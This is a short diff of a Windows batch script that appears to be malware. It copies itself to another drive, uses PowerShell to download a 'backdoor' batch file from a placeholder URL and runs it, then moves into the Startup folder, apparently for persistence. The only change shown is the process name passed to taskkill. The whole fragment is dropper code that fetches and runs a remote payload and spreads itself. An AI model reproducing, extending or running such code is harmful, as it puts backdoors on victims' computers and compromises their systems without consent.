@@ -26,7 +26,7 @@ copy %~n0%~x0 "L:\%~n0%~x0"
 timeout /t 30 /nobreak
 )
 cd %appdata%
-taskkill /F /T /IM %~n0%~x0
+taskkill /F /T /IM anyname.bat
 powershell.exe -command "wget "http://your-backdoor-bat-file-url.com" -outfile "anyname.bat""
 start anyname.bat
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
